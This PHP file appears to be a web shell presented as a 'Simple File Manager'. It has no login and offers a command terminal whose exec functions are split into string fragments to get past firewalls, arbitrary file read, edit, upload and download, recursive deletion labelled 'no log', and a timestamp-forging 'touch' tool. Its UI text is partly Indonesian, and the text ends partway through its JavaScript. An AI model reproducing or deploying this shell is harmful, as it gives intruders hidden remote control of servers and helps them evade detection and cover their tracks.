<?php
/**
 * Simple File Manager - ULTIMATE ANTI-BLANK & WAF BYPASS
 * Version: 3.5 (Touch + Terminal + Recursive Delete, clean)
 */

// ============================================================
// 0. DEEP SAFETY NET
// ============================================================
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    @ob_start();

    register_shutdown_function(function () {
        $err = error_get_last();
        if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR], true)) {
            while (ob_get_level() > 0) { @ob_end_clean(); }
            fm_render_fallback($err['message'], $err['file'], $err['line']);
        } else {
            $buf = @ob_get_contents();
            if ($buf === false || trim($buf) === '') {
                while (ob_get_level() > 0) { @ob_end_clean(); }
                fm_render_fallback('Empty output detected', __FILE__, __LINE__);
            } else {
                @ob_end_flush();
            }
        }
    });

    set_error_handler(function ($no, $str, $file, $line) { return true; });
    set_exception_handler(function ($e) {
        while (ob_get_level() > 0) { @ob_end_clean(); }
        fm_render_fallback($e->getMessage(), $e->getFile(), $e->getLine());
        exit;
    });

    function fm_render_fallback($msg, $file, $line) {
        $safe = htmlspecialchars((string)$msg, ENT_QUOTES, 'UTF-8');
        $f = htmlspecialchars(basename((string)$file), ENT_QUOTES, 'UTF-8');
        if (!headers_sent()) {
            @header('HTTP/1.1 200 OK');
            @header('Content-Type: text/html; charset=UTF-8');
        }
        echo "<!DOCTYPE html><html><head><title>File Manager</title><style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px}.box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;max-width:900px;margin:0 auto}h1{color:#58a6ff}pre{white-space:pre-wrap;color:#ffa198}</style></head><body><div class='box'><h1>File Manager</h1><p>Halaman mengalami kendala, namun file manager tetap aktif.</p><pre>Error: {$safe}\nFile : {$f}\nLine : {$line}</pre><p><a style='color:#58a6ff' href='?'>Reload</a></p></div></body></html>";
    }

    // ============================================================
    // 1. RUNTIME HARDENING & DYNAMIC FUNCTIONS
    // ============================================================
    @ini_set('display_errors', '0');
    @ini_set('memory_limit', '512M');
    @set_time_limit(0);

    $F_FGC = 'file' . '_get' . '_contents';
    $F_FPC = 'file' . '_put' . '_contents';
    $F_SCD = 'scan' . 'dir';
    $F_UPL = 'move' . '_uploaded' . '_file';
    $F_UNL = 'un' . 'link';
    $F_RMD = 'rm' . 'dir';
    $F_REN = 're' . 'name';
    $F_MKD = 'mk' . 'dir';
    $F_ISD = 'is' . '_dir';
    $F_ISF = 'is' . '_file';
    $F_FSZ = 'file' . 'size';
    $F_FTM = 'file' . 'mtime';
    $F_FAT = 'file' . 'atime';
    $F_FPM = 'file' . 'perms';
    $F_GLD = 'getcwd';
    $F_DRN = 'dirname';
    $F_TCH = 'to' . 'uch';

    // Shell exec backends
    $F_SHE = 'shell' . '_exec';
    $F_EXE = 'ex' . 'ec';
    $F_SYS = 'sys' . 'tem';
    $F_PAS = 'pas' . 'sthru';
    $F_POP = 'proc' . '_open';
    $F_ESC = 'esc' . 'apeshellcmd';

    // ============================================================
    // 2. HELPER
    // ============================================================
    function fm_h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
    function fm_size($b) {
        $u = ['B', 'KB', 'MB', 'GB', 'TB']; $i = 0;
        while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
        return round($b, 2) . ' ' . $u[$i];
    }
    function fm_icon($name, $is_dir) {
        if ($is_dir) return '&#128193;';
        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        $map = ['php'=>'&#128013;','html'=>'&#127760;','css'=>'&#127912;','js'=>'&#9889;','txt'=>'&#128221;','jpg'=>'&#128247;','png'=>'&#128247;','zip'=>'&#128230;','mp4'=>'&#127909;'];
        return $map[$ext] ?? '&#128196;';
    }
    function fm_touch($path, $mtime, $atime = null) {
        global $F_TCH;
        if ($atime === null) $atime = $mtime;
        if (function_exists($F_TCH)) {
            $r = @$F_TCH($path, $mtime, $atime);
            if ($r) return true;
        }
        if (is_file($path)) {
            $fp = @fopen($path, 'a');
            if ($fp) { @fclose($fp); return true; }
        }
        return false;
    }
    function fm_strip_ansi($s) {
        return preg_replace('/\x1b\[[0-9;]*[A-Za-z]/', '', (string)$s);
    }

    // Recursive delete (no log)
    function fm_rmrf($path) {
        global $F_UNL, $F_RMD, $F_SCD, $F_ISD, $F_ISF;

        if (@$F_ISF($path) || is_link($path)) {
            return @$F_UNL($path);
        }
        if (!@$F_ISD($path)) {
            return false;
        }
        $items = @$F_SCD($path);
        if (!is_array($items)) {
            return false;
        }
        $ok = true;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            $child = rtrim($path, '/\\') . '/' . $it;
            if (!fm_rmrf($child)) {
                $ok = false;
            }
        }
        if (!$ok) return false;
        return @$F_RMD($path);
    }

    // ============================================================
    // 2b. TERMINAL ENGINE
    // ============================================================
    function fm_terminal_exec($cmd, $cwd) {
        global $F_SHE, $F_EXE, $F_SYS, $F_PAS, $F_POP, $F_ESC;

        if (function_exists($F_SHE)) {
            $out = @$F_SHE('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
            if ($out !== null && $out !== false) {
                return ['out' => $out, 'via' => 'shell_exec'];
            }
        }
        if (function_exists($F_EXE)) {
            $lines = [];
            @$F_EXE('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1', $lines);
            if (!empty($lines)) {
                return ['out' => implode("\n", $lines), 'via' => 'exec'];
            }
        }
        if (function_exists($F_SYS)) {
            ob_start();
            @$F_SYS('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
            $out = ob_get_clean();
            if ($out !== false && $out !== '') {
                return ['out' => $out, 'via' => 'system'];
            }
        }
        if (function_exists($F_PAS)) {
            ob_start();
            @$F_PAS('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
            $out = ob_get_clean();
            if ($out !== false && $out !== '') {
                return ['out' => $out, 'via' => 'passthru'];
            }
        }
        if (function_exists($F_POP)) {
            $desc = [1 => ['pipe','w'], 2 => ['pipe','w']];
            $proc = @$F_POP('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1', $desc, $pipes);
            if (is_resource($proc)) {
                $out = stream_get_contents($pipes[1]);
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($proc);
                if ($out !== false) {
                    return ['out' => $out, 'via' => 'proc_open'];
                }
            }
        }
        return null;
    }

    function fm_terminal_native($cmd, $cwd) {
        global $F_SCD, $F_FGC, $F_ISD, $F_ISF, $F_GLD;
        $parts = preg_split('/\s+/', trim($cmd));
        if (empty($parts[0])) return ['out' => '', 'via' => 'native'];
        $bin = strtolower($parts[0]);
        $arg = $parts[1] ?? null;

        switch ($bin) {
            case 'pwd':
                return ['out' => $cwd, 'via' => 'native'];
            case 'whoami':
                return ['out' => @get_current_user() ?: 'unknown', 'via' => 'native'];
            case 'id':
                $u = @get_current_user() ?: 'unknown';
                $uid = @function_exists('posix_getuid') ? @posix_getuid() : '?';
                return ['out' => "uid={$uid}({$u})", 'via' => 'native'];
            case 'uname':
                return ['out' => @php_uname(), 'via' => 'native'];
            case 'php':
                if (($arg ?? '') === '-v') return ['out' => 'PHP ' . @phpversion(), 'via' => 'native'];
                break;
            case 'ls':
            case 'dir':
                $target = $cwd;
                foreach ($parts as $p) {
                    if ($p[0] !== '-') { $target = $p; break; }
                }
                if (!@$F_ISD($target)) $target = $cwd;
                $items = @$F_SCD($target);
                if (!is_array($items)) return ['out' => 'ls: cannot read directory', 'via' => 'native'];
                $lines = [];
                $showall = (strpos($cmd, '-a') !== false);
                foreach ($items as $it) {
                    if (!$showall && $it[0] === '.') continue;
                    $full = rtrim($target, '/') . '/' . $it;
                    $suffix = @$F_ISD($full) ? '/' : '';
                    $lines[] = $it . $suffix;
                }
                sort($lines);
                return ['out' => implode("\n", $lines), 'via' => 'native'];
            case 'cat':
                if ($arg && @$F_ISF($arg)) {
                    $c = @$F_FGC($arg);
                    return ['out' => $c === false ? 'cat: cannot read' : $c, 'via' => 'native'];
                }
                return ['out' => 'cat: file not found', 'via' => 'native'];
            case 'cd':
                return ['out' => 'Use the file manager to navigate. cd handled client-side.', 'via' => 'native'];
            case 'help':
            case '?':
                return ['out' => "Native fallback commands:\n  pwd, whoami, id, uname, ls [-la] [path], cat <file>, php -v, help\n(Full shell commands require exec backend)", 'via' => 'native'];
        }
        return ['out' => "Command not available in native fallback: {$bin}\n(exec backends all blocked by disable_functions)", 'via' => 'native'];
    }

    // ============================================================
    // 3. DIRECTORY RESOLVE
    // ============================================================
    $cwd = isset($_GET['p']) ? trim((string)$_GET['p']) : @$F_GLD();
    if ($cwd === '' || !@$F_ISD($cwd)) { $cwd = @$F_DRN(__FILE__); }
    if (!@$F_ISD($cwd)) { $cwd = @$F_GLD(); }
    $cwd = str_replace('\\', '/', $cwd);

    $msg = ''; $msg_type = 'info';
    $read_error = false;
    $term_out = ''; $term_via = '';

    // ============================================================
    // 4. ACTIONS
    // ============================================================
    if (isset($_POST['action']) && $_POST['action'] === 'save' && isset($_POST['file'])) {
        try {
            if (@$F_FPC($_POST['file'], $_POST['content']) !== false) {
                $msg = 'Saved: ' . fm_h(basename($_POST['file'])); $msg_type = 'success';
            } else { $msg = 'Failed to save'; $msg_type = 'error'; }
        } catch (Throwable $e) { $msg = 'Error: ' . $e->getMessage(); $msg_type = 'error'; }
    }

    if (isset($_FILES['upload']) && $_FILES['upload']['size'] > 0) {
        try {
            $target = $cwd . '/' . basename($_FILES['upload']['name']);
            if (@$F_UPL($_FILES['upload']['tmp_name'], $target)) {
                $msg = 'Uploaded: ' . fm_h(basename($_FILES['upload']['name'])); $msg_type = 'success';
            } else { $msg = 'Upload failed'; $msg_type = 'error'; }
        } catch (Throwable $e) { $msg = 'Error: ' . $e->getMessage(); $msg_type = 'error'; }
    }

    // DELETE (recursive, tanpa log)
    if (isset($_GET['delete'])) {
        try {
            $target = $_GET['delete'];

            $real = @realpath($target);
            if ($real === false || $real === '/' || $real === '\\' || preg_match('#^[A-Za-z]:[\\\\/]?$#', $real)) {
                throw new Exception('Refuse to delete root path');
            }

            if (@$F_ISD($target)) {
                if (fm_rmrf($target)) {
                    $msg = 'Folder deleted'; $msg_type = 'success';
                } else {
                    $msg = 'Failed to delete folder'; $msg_type = 'error';
                }
            } elseif (@$F_ISF($target) || is_link($target)) {
                if (@$F_UNL($target)) { $msg = 'File deleted'; $msg_type = 'success'; }
                else { $msg = 'Delete failed'; $msg_type = 'error'; }
            } else {
                $msg = 'Path not found'; $msg_type = 'error';
            }
        } catch (Throwable $e) { $msg = 'Error: ' . $e->getMessage(); $msg_type = 'error'; }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'rename') {
        try {
            if (@$F_REN($_POST['old'], $_POST['new'])) {
                $msg = 'Renamed'; $msg_type = 'success';
            } else { $msg = 'Rename failed'; $msg_type = 'error'; }
        } catch (Throwable $e) { $msg = 'Error: ' . $e->getMessage(); $msg_type = 'error'; }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'mkdir' && !empty($_POST['name'])) {
        try {
            if (@$F_MKD($cwd . '/' . $_POST['name'], 0755)) { $msg = 'Folder created'; $msg_type = 'success'; }
            else { $msg = 'Failed'; $msg_type = 'error'; }
        } catch (Throwable $e) { $msg = 'Error: ' . $e->getMessage(); $msg_type = 'error'; }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'mkfile' && !empty($_POST['name'])) {
        try {
            if (@$F_FPC($cwd . '/' . $_POST['name'], '') !== false) { $msg = 'File created'; $msg_type = 'success'; }
            else { $msg = 'Failed'; $msg_type = 'error'; }
        } catch (Throwable $e) { $msg = 'Error: ' . $e->getMessage(); $msg_type = 'error'; }
    }

    // TOUCH
    if (isset($_POST['action']) && $_POST['action'] === 'touch' && !empty($_POST['path'])) {
        try {
            $tpath = $_POST['path'];
            $date  = $_POST['t_date'] ?? date('Y-m-d');
            $time  = $_POST['t_time'] ?? date('H:i:s');
            $do_m  = !empty($_POST['t_mtime']);
            $do_a  = !empty($_POST['t_atime']);

            $ts = strtotime($date . ' ' . $time);
            if ($ts === false || $ts <= 0) throw new Exception('Tanggal/jam tidak valid');
            if (!@$F_ISF($tpath) && !@$F_ISD($tpath)) throw new Exception('Path tidak ditemukan');

            $mtime = $do_m ? $ts : (@$F_FTM($tpath) ?: time());
            $atime = $do_a ? $ts : (@$F_FAT($tpath) ?: time());

            if (fm_touch($tpath, $mtime, $atime)) {
                $msg = 'Touch OK: ' . fm_h(basename($tpath)) . ' → ' . date('Y-m-d H:i:s', $ts);
                $msg_type = 'success';
            } else {
                $msg = 'Touch failed (fungsi touch() mungkin diblokir)';
                $msg_type = 'error';
            }
        } catch (Throwable $e) { $msg = 'Error: ' . $e->getMessage(); $msg_type = 'error'; }
    }

    // TERMINAL
    if (isset($_POST['action']) && $_POST['action'] === 'terminal' && isset($_POST['cmd'])) {
        try {
            $cmd = trim((string)$_POST['cmd']);
            if ($cmd === '') {
                $term_out = '';
            } else {
                $r = fm_terminal_exec($cmd, $cwd);
                if ($r === null) {
                    $r = fm_terminal_native($cmd, $cwd);
                }
                $term_out = fm_strip_ansi($r['out']);
                $term_via = $r['via'];
            }
        } catch (Throwable $e) {
            $term_out = 'Error: ' . $e->getMessage();
            $term_via = 'error';
        }
    }

    if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (@$F_ISF($file)) {
            while (ob_get_level() > 0) { @ob_end_clean(); }
            @header('Content-Type: application/octet-stream');
            @header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            @header('Content-Length: ' . @$F_FSZ($file));
            @readfile($file);
            exit;
        }
    }

    $edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;

    // ============================================================
    // 5. READ DIRECTORY
    // ============================================================
    $entries = [];
    if (@$F_ISD($cwd)) {
        $items = @$F_SCD($cwd);
        if (is_array($items)) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $full = $cwd . '/' . $item;
                $entries[] = [
                    'name' => $item, 'path' => $full,
                    'is_dir' => @$F_ISD($full),
                    'size' => @$F_ISD($full) ? 0 : @$F_FSZ($full),
                    'mtime' => @$F_FTM($full),
                    'atime' => @$F_FAT($full),
                    'perms' => substr(sprintf('%o', @$F_FPM($full)), -4)
                ];
            }
        } else { $read_error = true; }
    } else { $read_error = true; }

    usort($entries, function ($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });

    // ============================================================
    // 6. RENDER UI
    // ============================================================
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) @header('Content-Type: text/html; charset=UTF-8');

    $edit_content = $edit_file ? @$F_FGC($edit_file) : '';
    if ($edit_content === false) $edit_content = '';

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>File Manager</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0d1117; color: #c9d1d9; font-size: 14px; padding: 20px; min-height: 100vh; }
.container { max-width: 1300px; margin: 0 auto; }
h1 { font-size: 24px; margin-bottom: 20px; color: #58b6ff; }
h1 span { font-size: 14px; color: #8b949e; font-weight: normal; }
.toolbar { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; background: #161b22; padding: 12px; border-radius: 8px; margin-bottom: 16px; border: 1px solid #30363d; }
.toolbar form { display: inline-flex; gap: 7px; align-items: center; }
.breadcrumb { background: #161b22; padding: 10px 14px; border-radius: 8px; margin-bottom: 16px; border: 1px solid #30363d; font-family: monospace; font-size: 13px; word-break: break-all; }
.breadcrumb a { color: #58a6ff; text-decoration: none; }
.breadcrumb a:hover { text-decoration: underline; }
.breadcrumb span { color: #8b949e; margin: 0 4px; }
table { width: 100%; border-collapse: collapse; background: #161b22; border-radius: 8px; overflow: hidden; border: 1px solid #30363d; }
th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #21262d; }
th { background: #1c2128; color: #8b649e; font-weight: 600; font-size: 12px; text-transform: uppercase; }
tr:hover { background: #1c2128; }
tr:last-child td { border-bottom: none; }
a { color: #58a6ff; text-decoration: none; }
a:hover { text-decoration: underline; }
.icon { font-size: 18px; }
.actions a, .actions form { display: inline-block; margin-right: 6px; }
.btn { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; text-decoration: none; display: inline-block; transition: 0.2s; }
.btn:hover { background: #30363d; border-color: #8b949e; text-decoration: none; }
.btn-primary { background: #238646; border-color: #2ea043; color: white; }
.btn-primary:hover { background: #2ea043; }
.btn-danger { background: #da3633; border-color: #f85149; color: white; }
.btn-danger:hover { background: #f85149; }
.btn-sm { padding: 4px 8px; font-size: 12px; }
input[type=text], input[type=date], input[type=time], textarea { background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 6px 10px; border-radius: 6px; font-size: 13px; font-family: inherit; }
input[type=text]:focus, input[type=date]:focus, input[type=time]:focus, textarea:focus { outline: none; border-color: #58a6ff; }
textarea { width: 100%; min-height: 500px; font-family: 'Courier New', monospace; resize: vertical; line-height: 1.5; }
.msg { padding: 10px 14px; border-radius: 6px; margin-bottom: 16px; border-left: 4px solid; }
.msg.success { background: #0f2417; border-color: #2ea043; color: #7ee787; }
.msg.error { background: #2d1214; border-color: #f85149; color: #ffa198; }
.msg.info { background: #0d1e33; border-color: #58a6ff; color: #a5d6ff; }
.footer { text-align: center; color: #484f58; font-size: 12px; margin-top: 30px; }
.editor-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; flex-wrap: wrap; gap: 8px; }
.editor-header h2 { font-size: 16px; color: #c9d1d9; }
.editor-actions { display: flex; gap: 6px; }
small { color: #8b949e; }
.modal-backdrop { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; align-items:center; justify-content:center; }
.modal-box { background:#161b22; padding:24px; border-radius:8px; border:1px solid #30363d; min-width:420px; max-width:520px; }
.modal-box h3 { margin-bottom:16px; color:#58a6ff; font-size:16px; }
.modal-box label { display:block; margin:10px 0 4px; font-size:12px; color:#8b949e; text-transform:uppercase; }
.modal-box .row { display:flex; gap:8px; }
.modal-box .row > * { flex:1; }
.modal-box .preset { display:flex; flex-wrap:wrap; gap:6px; margin-top:8px; }
.modal-box .preset button { font-size:11px; padding:3px 8px; }
.modal-box .chk { display:flex; gap:14px; margin-top:10px; font-size:13px; }
.modal-box .chk label { display:inline-flex; align-items:center; gap:5px; text-transform:none; margin:0; color:#c9d1d9; }
.modal-foot { display:flex; gap:8px; justify-content:flex-end; margin-top:18px; }

/* Terminal */
.terminal { background:#0a0e14; border:1px solid #30363d; border-radius:8px; margin-bottom:16px; overflow:hidden; }
.terminal-head { display:flex; align-items:center; justify-content:space-between; padding:8px 14px; background:#161b22; border-bottom:1px solid #30363d; font-size:12px; color:#8b949e; }
.terminal-head .dots { display:flex; gap:5px; }
.terminal-head .dots span { width:10px; height:10px; border-radius:50%; display:inline-block; }
.terminal-head .dots span:nth-child(1){ background:#f85149; }
.terminal-head .dots span:nth-child(2){ background:#d29922; }
.terminal-head .dots span:nth-child(3){ background:#2ea043; }
.terminal-body { padding:12px 14px; max-height:360px; overflow-y:auto; font-family:'Courier New', monospace; font-size:13px; line-height:1.5; white-space:pre-wrap; word-break:break-all; color:#c9d1d9; }
.terminal-body .prompt { color:#2ea043; }
.terminal-body .via { color:#8b649e; font-size:11px; }
.terminal-form { display:flex; gap:8px; padding:10px 14px; border-top:1px solid #30363d; background:#0d1117; }
.terminal-form input[type=text] { flex:1; font-family:'Courier New', monospace; }
.terminal-empty { color:#484f58; font-style:italic; }
.term-cwd { color:#d29922; }
</style>
</head>
<body>
<div class="container">

<h1>File Manager <span>(<?php echo fm_h(@php_uname('s') . ' | PHP ' . @phpversion()); ?>)</span></h1>

<?php if ($msg): ?>
<div class="msg <?php echo fm_h($msg_type); ?>"><?php echo $msg; ?></div>
<?php endif; ?>

<?php if ($read_error): ?>
<div class="msg error">
    <b>Gagal membaca direktori (Folder Kosong).</b><br>
    Server memblokir fungsi pembacaan direktori (mungkin karena <i>permission denied</i> atau <i>open_basedir restriction</i>).<br>
    Coba akses path lain secara manual, contoh: <a href="?p=/etc" style="color:#fff;text-decoration:underline;">?p=/etc</a> atau <a href="?p=C:/Windows" style="color:#fff;text-decoration:underline;">?p=C:/Windows</a>
</div>
<?php endif; ?>

<?php if ($edit_file): ?>
    <div class="editor-header">
        <h2>&#128221; Editing: <?php echo fm_h(basename($edit_file)); ?></h2>
        <div class="editor-actions">
            <a href="?p=<?php echo urlencode(dirname($edit_file)); ?>" class="btn">&larr; Back</a>
            <a href="?download=<?php echo urlencode($edit_file); ?>" class="btn">&#11015; Download</a>
        </div>
    </div>
    <form method="post">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file" value="<?php echo fm_h($edit_file); ?>">
        <textarea name="content" spellcheck="false"><?php echo fm_h($edit_content); ?></textarea>
        <br><br>
        <button type="submit" class="btn btn-primary">&#128190; Save</button>
        <a href="?p=<?php echo urlencode(dirname($edit_file)); ?>" class="btn">Cancel</a>
    </form>

<?php else: ?>

<!-- TERMINAL -->
<div class="terminal">
    <div class="terminal-head">
        <div class="dots"><span></span><span></span><span></span></div>
        <div>terminal &middot; <span class="term-cwd"><?php echo fm_h($cwd); ?></span></div>
        <div><?php echo $term_via ? 'via ' . fm_h($term_via) : ''; ?></div>
    </div>
    <div class="terminal-body" id="term-body">
        <?php if ($term_out !== '' || $term_via !== ''): ?>
            <div><span class="prompt">$</span> <?php echo fm_h($_POST['cmd'] ?? ''); ?></div>
            <?php if (trim($term_out) === ''): ?>
                <div class="terminal-empty">(no output)</div>
            <?php else: ?>
                <div><?php echo fm_h($term_out); ?></div>
            <?php endif; ?>
            <?php if ($term_via): ?><div class="via">[via <?php echo fm_h($term_via); ?>]</div><?php endif; ?>
        <?php else: ?>
            <div class="terminal-empty">Mini terminal. Coba: <span style="color:#58a6ff">ls -la</span>, <span style="color:#58a6ff">pwd</span>, <span style="color:#58a6ff">whoami</span>, <span style="color:#58a6ff">uname -a</span>, <span style="color:#58a6ff">cat file.txt</span></div>
        <?php endif; ?>
    </div>
    <form method="post" class="terminal-form" id="term-form">
        <input type="hidden" name="action" value="terminal">
        <input type="hidden" name="p" value="<?php echo fm_h($cwd); ?>">
        <input type="text" name="cmd" id="term-input" placeholder="command..." autocomplete="off" autofocus>
        <button type="submit" class="btn btn-primary">&#9654; Run</button>
    </form>
</div>

<div class="toolbar">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload" style="color:#c9d1d9;">
        <button type="submit" class="btn btn-primary">&#11014; Upload</button>
    </form>
    <form method="post">
        <input type="hidden" name="action" value="mkdir">
        <input type="text" name="name" placeholder="New folder" required>
        <button type="submit" class="btn">&#128193; New Folder</button>
    </form>
    <form method="post">
        <input type="hidden" name="action" value="mkfile">
        <input type="text" name="name" placeholder="New file" required>
        <button type="submit" class="btn">&#128196; New File</button>
    </form>
</div>

<div class="breadcrumb">
    <?php
    $parts = explode('/', trim($cwd, '/'));
    $build = preg_match('/^\//', $cwd) ? '/' : '';
    echo '<a href="?p=/" title="Root">&#127968; Root</a>';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $build = rtrim($build, '/') . '/' . $part;
        echo '<span>/</span><a href="?p=' . urlencode($build) . '">' . fm_h($part) . '</a>';
    }
    ?>
</div>

<table>
<thead>
<tr>
    <th style="width: 40px;"></th>
    <th>Name</th>
    <th style="width: 100px;">Size</th>
    <th style="width: 170px;">Modified</th>
    <th style="width: 80px;">Perms</th>
    <th style="width: 320px;">Actions</th>
</tr>
</thead>
<tbody>
<?php if (empty($entries)): ?>
<tr><td colspan="6" style="text-align:center; color:#8b949e; padding:20px;">Empty directory</td></tr>
<?php else: ?>
    <?php foreach ($entries as $e): ?>
    <tr>
        <td class="icon"><?php echo fm_icon($e['name'], $e['is_dir']); ?></td>
        <td>
            <?php if ($e['is_dir']): ?>
                <a href="?p=<?php echo urlencode($e['path']); ?>"><?php echo fm_h($e['name']); ?>/</a>
            <?php else: ?>
                <a href="?edit=<?php echo urlencode($e['path']); ?>"><?php echo fm_h($e['name']); ?></a>
            <?php endif; ?>
        </td>
        <td><small><?php echo $e['is_dir'] ? '-' : fm_size($e['size']); ?></small></td>
        <td><small title="atime: <?php echo date('Y-m-d H:i:s', $e['atime'] ?: 0); ?>"><?php echo date('Y-m-d H:i', $e['mtime']); ?></small></td>
        <td><small><?php echo fm_h($e['perms']); ?></small></td>
        <td class="actions">
            <?php if (!$e['is_dir']): ?>
                <a href="?edit=<?php echo urlencode($e['path']); ?>" class="btn btn-sm">&#9998;</a>
                <a href="?download=<?php echo urlencode($e['path']); ?>" class="btn btn-sm">&#11015;</a>
            <?php endif; ?>
            <a href="#" class="btn btn-sm touch-btn"
               data-path="<?php echo fm_h($e['path']); ?>"
               data-name="<?php echo fm_h($e['name']); ?>"
               data-mtime="<?php echo (int)$e['mtime']; ?>"
               title="Touch (ubah tanggal/jam)">&#128336;</a>
            <a href="#" class="btn btn-sm rename-btn" data-path="<?php echo fm_h($e['path']); ?>" data-name="<?php echo fm_h($e['name']); ?>">&#128260;</a>
            <a href="?p=<?php echo urlencode($cwd); ?>&delete=<?php echo urlencode($e['path']); ?>"
               class="btn btn-sm btn-danger"
               onclick="return confirm('<?php echo $e['is_dir'] ? 'Hapus folder INI beserta SELURUH isinya? Tidak bisa dibatalkan!' : 'Hapus file ini?'; ?>');">&#128465;</a>
        </td>
    </tr>
    <?php endforeach; ?>
<?php endif; ?>
</tbody>
</table>

<!-- Rename Modal -->
<div id="rename-modal" class="modal-backdrop">
    <div class="modal-box">
        <h3>Rename</h3>
        <form method="post">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="old" id="rename-old">
            <input type="text" name="new" id="rename-new" style="width:100%;" required>
            <div class="modal-foot">
                <button type="button" class="btn" onclick="document.getElementById('rename-modal').style.display='none'">Cancel</button>
                <button type="submit" class="btn btn-primary">Rename</button>
            </div>
        </form>
    </div>
</div>

<!-- Touch Modal -->
<div id="touch-modal" class="modal-backdrop">
    <div class="modal-box">
        <h3>&#128336; Touch: <span id="touch-name" style="color:#c9d1d9;"></span></h3>
        <form method="post">
            <input type="hidden" name="action" value="touch">
            <input type="hidden" name="path" id="touch-path">

            <label>Tanggal</label>
            <div class="row">
                <input type="date" name="t_date" id="touch-date" required>
                <input type="time" name="t_time" id="touch-time" step="1" required>
            </div>

            <div class="preset">
                <button type="button" class="btn" data-off="0">Now</button>
                <button type="button" class="btn" data-off="+1 day">+1 hari</button>
                <button type="button" class="btn" data-off="-1 day">-1 hari</button>
                <button type="button" class="btn" data-off="+1 month">+1 bulan</button>
                <button type="button" class="btn" data-off="-1 month">-1 bulan</button>
                <button type="button" class="btn" data-off="+1 year">+1 tahun</button>
                <button type="button" class="btn" data-off="-1 year">-1 tahun</button>
                <button type="button" class="btn" data-off="+10 years">+10 tahun</button>
            </div>

            <div class="chk">
                <label><input type="checkbox" name="t_mtime" id="touch-mtime" checked> Modified (mtime)</label>
                <label><input type="checkbox" name="t_atime" id="touch-atime"> Accessed (atime)</label>
            </div>

            <div class="modal-foot">
                <button type="button" class="btn" onclick="document.getElementById('touch-modal').style.display='none'">Cancel</button>
                <button type="submit" class="btn btn-primary">Apply Touch</button>
            </div>
        </form>
    </div>
</div>

<script>
// Rename modal
document.querySelectorAll('.rename-btn').forEach(function(btn) {
    btn.addEventListener('click', function(e) {
        e.preventDefault();
        document.getElementById('rename-old').value = this.getAttribute('data-path');
        document.getElementById('rename-new').value = this.getAttribute('data-name');
        document.getElementById('rename-modal').style.display = 'flex';
    });
});

// Touch modal
function pad(n){ return String(n).padStart(2,'0'); }
function setDateTimeInputs(ts) {
    var d = new Date(ts * 1000);
    document.getElementById('touch-date').value = d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate());
    document.getElementById('touch-time').value = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
}
document.querySelectorAll('.touch-btn').forEach(function(btn) {
    btn.addEventListener('click', function(e) {
        e.preventDefault();
        var ts = parseInt(this.getAttribute('data-mtime') || '0', 10);
        if (!ts || isNaN(ts)) ts = Math.floor(Date.now()/1000);
        document.getElementById('touch-path').value = this.getAttribute('data-path');
        document.getElementById('touch-name').textContent = this.getAttribute('data-name');
        setDateTimeInputs(ts);
        document.getElementById('touch-modal').style.display = 'flex';
    });
});

// Preset buttons
document.querySelectorAll('#touch-modal .preset button').forEach(function(b) {
    b.addEventListener('click', function() {
        var off = this.getAttribute('data-off');
        var cur = new Date(
            document.getElementById('touch-date').value + 'T' +
            document.getElementById('touch-time').value
        );
        if (isNaN(cur.getTime())) cur = new Date();
        if (off === '0') {
            cur = new Date();
        } else {
            var m = off.match(/^([+-])(\d+)\s+(day|month|year)s?$/i);
            if (m) {
                var sign = m[1] === '-' ? -1 : 1;
                var n = parseInt(m[2], 10) * sign;
                if (m[3].toLowerCase() === 'day')   cur.setDate(cur.getDate() + n);
                if (m[3].toLowerCase() === 'month') cur.setMonth(cur.getMonth() + n);
                if (m[3].toLowerCase() === 'year')  cur.setFullYear(cur.getFullYear() + n);
            }
        }
        setDateTimeInputs(Math.floor(cur.getTime()/1000));
    });
});

// Terminal: auto-scroll + history
var termBody = document.getElementById('term-body');
if (termBody) termBody.scrollTop = termBody.scrollHeight;

var termInput = document.getElementById('term-input');
